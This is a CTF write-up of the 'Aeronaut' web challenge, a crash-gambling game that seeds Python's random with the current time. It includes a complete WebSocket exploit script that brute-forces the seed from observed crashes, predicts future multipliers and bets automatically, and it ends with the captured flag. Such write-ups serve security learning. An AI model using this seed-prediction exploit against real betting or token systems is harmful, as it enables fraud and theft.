---
title: CornCTF2025 | Aeronaut
published: 2025-11-21
description: Aeronaut is a gambling game in which you bet on a multiplier. The goal is to get 100.000.000$. Good luck!
image: ''
tags: ["web"]
authors: ["akiidjk"]
solves: 17
points: 300
firstblood: false
category: CornCTF2025
draft: false

---



## Introduction

The last round of the CyberCup2025 competition was very good, with a challenging CTF. The challenge is a gambling game in which you bet on a multiplier. The goal is to earn 100,000,000 dollars. The game is implemented in Python using WebSocket and uses insecure randomness to generate multipliers. This allows us to predict the next multiplier and exploit the game.

## Source

```python
# filename: file.py
def game_loop():
    """Background game loop"""
    round_number = 0
    random.seed(int(time.time()))
    mult_list = [generate_multiplier() for i in range(10000)]
    while True:
        # Start new round
        gs.max_multiplier = mult_list[round_number % 10000]
        round_number += 1
        gs.current_multiplier = 1.0
        gs.game_phase = 'betting'
        gs.round_start_time = time.time()
```

The seed is technically predictable. Initially, I wasn't sure it would work because the instance might have been activated for too long, which would have made brute forcing impossible. Fortunately, my colleague persuaded me to try it out and it worked very well, requiring only 12 hours of brute forcing in about 10 minutes.

## Solution

I created a simple and effective script that takes crash data and uses brute force to compare the seed with the crash streak. Then, I can predict the next crash and automatically place a bet.

```python
# filename: exploit.py

#!/usr/bin/env python3

import asyncio
import random
import time
import socketio
import functools
import concurrent.futures

URL       = "http://localhost:5000"
SIO_PATH  = "/socket.io"
HOUSE     = 0.01
OBS_N     = 10
SEARCH_H  = 12 * 3600  # +- 12 ore
EXEC      = concurrent.futures.ThreadPoolExecutor(max_workers=1)

def _mult(rng, house_edge=HOUSE):
    F = 1 - house_edge
    return (1 / rng.uniform(0.01, 1.0)) * F

def build_seq(seed, n=10_000):
    rng = random.Random(seed)
    return [_mult(rng) for _ in range(n)]

def brute_seed_sync(obs, start, end):
    for seed in range(start, end + 1):
        seq = build_seq(seed)
        for i in range(len(seq) - len(obs) + 1):
            if all(abs(seq[i+j] - obs[j]) < 0.01 for j in range(len(obs))):
                return seed, i
    raise RuntimeError("Seed non trovato")

async def main():
    sio         = socketio.AsyncClient()
    observed    = []
    brute_fut   = None
    seed        = offset = None
    sequence    = None
    idx         = 0
    has_bet     = False
    has_cashed  = False
    balance = None

    @sio.event
    async def connect():
        print(f"[+] connected – waiting {OBS_N} crash…")

    @sio.on("cashout_response")
    async def on_bet_response(data):
        nonlocal balance
        if data.get("success"):
            balance = data.get("balance")
            print(f"[+] Bet accepted. New balance: {balance}")
        else:
            print("[-] Bet failed.")

    @sio.on("game_state")
    async def on_state(d):
        nonlocal brute_fut, seed, offset, sequence, idx, has_bet, has_cashed, balance
        phase = d["phase"]

        if phase == "betting":
            if seed is not None and not has_bet:
                if balance is None:
                    balance = 10
                if sequence is not None:
                    print("[+] Current balance: ",balance)
                    next_crash = sequence[(idx - 1) % 10_000]
                    print(f"[+] Betting – predicted crash: {next_crash:.2f}")
                    await sio.emit("place_bet", {"amount": int(balance)})
                    has_bet = True

        elif phase == "game":
            if seed is not None and has_bet and not has_cashed:
                next_crash = sequence[(idx - 1) % 10_000]
                cashout_at = max(1.01, next_crash - 0.05)
                current_multiplier = float(d.get("multiplier", 1.0))

                if current_multiplier >= cashout_at:
                    print(f"[+] Cashing out at {current_multiplier:.2f} "
                          f"(before predicted crash {next_crash:.2f})")
                    await sio.emit("cashout")
                    has_cashed = True

        elif phase == "ended":
            crash = float(d["multiplier"])
            observed.append(crash)
            print(f"[+] crash #{len(observed)}: {crash:.2f}")

            if brute_fut is None and len(observed) >= OBS_N:
                now   = int(time.time())
                start = now - SEARCH_H
                print(f"[+] brute-force {start} → {now}… (in thread)")
                loop = asyncio.get_running_loop()
                brute_fut = loop.run_in_executor(
                    EXEC,
                    functools.partial(brute_seed_sync,
                                      obs=observed[:OBS_N],
                                      start=start,
                                      end=now)
                )

            if brute_fut is not None and brute_fut.done() and seed is None:
                seed, offset = brute_fut.result()
                sequence = build_seq(seed)
                idx = offset + len(observed)
                print("\n[+]  seed:", seed)
                print("[+]  start offset:", offset)
                print("[+]  current round:", idx % 10_000, "\n")

            if seed is not None:
                next_crash = sequence[idx % 10_000]
                print(f"[+]  Next expected crash: {next_crash:.2f}")
                idx += 1
            has_bet = False
            has_cashed = False


    @sio.on("error")
    async def on_error(msg):
        if "corn{" in msg:
            print("FLAG: ", msg["message"])
            exit(0)
        print("⚠️  server error:", msg)

    await sio.connect(URL, socketio_path=SIO_PATH, transports=["websocket"])
    await sio.wait()

if __name__ == "__main__":
    asyncio.run(main())

```

flag: :spoiler[corn{1_d0n7_g4mbl3_i_a1w4y5_w1n}]
